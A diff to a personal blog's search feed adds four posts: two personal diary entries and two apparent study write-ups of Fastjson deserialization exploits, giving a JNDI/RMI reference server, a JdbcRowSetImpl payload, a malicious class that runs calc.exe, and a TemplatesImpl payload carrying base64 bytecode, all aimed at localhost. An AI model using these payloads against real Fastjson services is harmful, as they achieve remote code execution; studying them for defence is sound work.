@@ -4,6 +4,106 @@
   
   
   <entry>
+    <title>致每一个努力的人</title>
+    <link href="/2022/03/08/%E8%87%B4%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%8A%AA%E5%8A%9B%E7%9A%84%E4%BA%BA/"/>
+    <url>/2022/03/08/%E8%87%B4%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%8A%AA%E5%8A%9B%E7%9A%84%E4%BA%BA/</url>
+    
+    <content type="html"><![CDATA[<p>、其实越长大就发现想要在一个领域做好，要付出很多。最近学习虽然都是复习之前学的，但是还是学了就忘，手敲代码还是不够熟练。可能确实有些小笨，感觉身边的人一次就学会了。算了也不说这些锤头丧气的话，继续冲！毕竟cuit，夜晚11点多的银兴大道不止只有你。就不花多时间写了。就是简单记录一下。顺便吐槽，密码学老师讲课真的差劲。（我严重怀疑他到底会不会！！！）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081834411.jpg" alt="IMG_20220302_232654"></p><p>还有还有！！今天第一次吃这个东西，没想到还挺好吃。下次回去让婆婆给我做这道菜！！（姑且称它狮子头包蛋。哈哈哈哈哈）<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081835734.jpg" alt="e87cc39086efc83e178cb12cde2f319"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>历程</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>历程</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>宝贝女生节快乐</title>
+    <link href="/2022/03/08/%E5%AE%9D%E8%B4%9D%E5%A5%B3%E7%94%9F%E8%8A%82%E5%BF%AB%E4%B9%90/"/>
+    <url>/2022/03/08/%E5%AE%9D%E8%B4%9D%E5%A5%B3%E7%94%9F%E8%8A%82%E5%BF%AB%E4%B9%90/</url>
+    
+    <content type="html"><![CDATA[<p>一年一度的三八节到啦。哦豁我得先去上密码学了。待会在来叨叨两句。<br>疫情太难受了，如果不是疫情可能我现在在跟宝贝玩。今天跟宝贝点了杯奶茶，看样子还挺开心得。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081824384.png" alt="image-20220308182453321"></p><p>离清明节越来越近，感觉好期待一起去峨眉山。<br>最后在祝宝贝女生节快乐哟。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>学生时代的爱情</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>爱情</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Fastjson（JdbcRowSetImpl）</title>
+    <link href="/2022/03/08/Fastjson%EF%BC%88JdbcRowSetImpl%EF%BC%89/"/>
+    <url>/2022/03/08/Fastjson%EF%BC%88JdbcRowSetImpl%EF%BC%89/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Fastjson（JNDI-RMI"><a href="#Fastjson（JNDI-RMI" class="headerlink" title="Fastjson（JNDI+RMI)"></a>Fastjson（JNDI+RMI)</h1><p>🐎*的，真就潜入JNDI是不行。手敲还是敲不对！<br>有一说一承认了，要不然不会弄这么久，就是还是没有搞懂JNDI注入。</p><h2 id="JNDIServer"><a href="#JNDIServer" class="headerlink" title="JNDIServer"></a>JNDIServer</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exloit&quot;</span>,<br>                <span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:80/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className, String factory, String factoryLocation)<br></code></pre></td></tr></table></figure><p>参数1：<code>className</code> - 远程加载时所使用的类名</p><p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p><p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p><p><strong>并且我们这里注意到Factory命名必须带上包的路径（就是需要完整的路径）。</strong>不然无法复现成功。<br><strong>当然，要把一个对象绑定到<code>RMI注册表</code>中，这个对象需要继承<code>UnicastRemoteObject</code>，但是<code>Reference</code>没有继承它，所以我们还需要封装一下它，用 <code>ReferenceWrapper</code> 包裹一下<code>Reference</code>实例对象，这样就可以将其绑定到<code>RMI注册表</code></strong></p><p>当去访问127.0.0.1&#x2F;Exloit.class的时候找不到。就会去访问我们设置的路径去执行恶意类代码。<strong>并且会调用其中的无参构造函数</strong>，还可以利用java的static代码块来写恶意代码，static代码块的代码在class文件被加载过后就会立即执行，且只执行一次。</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>这里就说关键部分。因为这个很多模块的函数调试不进去。<br>在之前<strong>fastjson基于TemplatesImpl触发链中</strong>，我们直接从这里进去。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535811.png" alt="QQ截图20220308151631"></p><p>会调试很久很久很久直接来到这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535859.png" alt="QQ截图20220308151706"></p><p>建议直接这里下个断点。位置如下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535460.png" alt="QQ截图20220308151802"></p><p>跟进这里又看不到。</p><p>建议直接断点来到这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535780.png" alt="QQ截图20220308152204"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535322.png" alt="QQ截图20220308152226"></p><p>跟进。**connect()**。来到这里，我们跟进看一下this.getDataSourceName()的值。发现就是我们传入的参数。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081524409.png" alt="QQ截图20220308152417"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535007.png" alt="QQ截图20220308152402"></p><p>所以就造成了JNDI注入。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplPoc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/xsw6a.Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(payload);<br><span class="hljs-comment">//        JSON.parseObject(payload);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>记得自己开启一个127.0.0.1:80的服务，并且将恶意类.class放入进去。我的电脑本机python3可以开启服务但是弹不出计算器。不知道原因。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>JavaWeb</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>java</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Fastjson（TemplateImpl）</title>
+    <link href="/2022/03/07/Fastjson%EF%BC%88TemplateImpl%EF%BC%89/"/>
+    <url>/2022/03/07/Fastjson%EF%BC%88TemplateImpl%EF%BC%89/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Fastjson（TemplatesImp）"><a href="#Fastjson（TemplatesImp）" class="headerlink" title="Fastjson（TemplatesImp）"></a>Fastjson（TemplatesImp）</h1><p>之前好几篇文章都是基于触发恶意类（TemplatesImp）调用getter方法。那么在之前分析的<strong>Fastjson</strong>中在反序列化的时候也会调用getter方法。所以就可以连起来了。</p><p><strong>基于1.2.22-1.2.24版本</strong></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>弄了我半天，才发现自己的弹计算器的命令输错了。我无语了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String s=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABRMeHN3NmEvRmFzdGpzb25FaXZsOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQARRmFzdGpzb25FaXZsLmphdmEMAAgACQcALwwAMAAxAQAIY2FsYy5leGUMADIAMwEAEnhzdzZhL0Zhc3Rqc29uRWl2bAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAATAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAYAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABsACAAcAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(s, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>回忆：在<strong>TemplateImpl</strong>中我们注意的点就是那三个参数值，两个不为空，一个要实例化。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112551.png" alt="QQ截图20220307193542"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071936060.png" alt="QQ截图20220307193608"></p><p>可以注意到，这里的<strong>name</strong> 、<strong>bytecode</strong>都有自己set方法，虽然是私有属性但是也可以赋值。<br>但是不碰巧这里的<strong>tfactory</strong>没有自己的set方法。<br>但是碰巧的是fastjson中</p><p><strong>如果开启了，Feature.SupportNonPublicField。在fastjson反序列化的时候会判断是否存在无参构造函数，如果存在的话就会直接去调用setter方法给属性赋值，而没有 setter 方法的属性如果开启了Feature.SupportNonPublicField的话也会通过反射去给属性赋值。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112058.png" alt="QQ截图20220307205404"></p><p>这里判断了<strong>SupportNonPublicField</strong></p><p>实在不想截图。最后就会调用到getO..方法。触发TemplatesImpl链。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112931.png" alt="QQ截图20220307211055"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>JavaWeb</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>java</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>RMI+LDAP+JRMP+JNDI（了解）</title>
     <link href="/2022/03/07/RMI-LDAP-JRMP-JNDI%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89/"/>
     <url>/2022/03/07/RMI-LDAP-JRMP-JNDI%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89/</url>
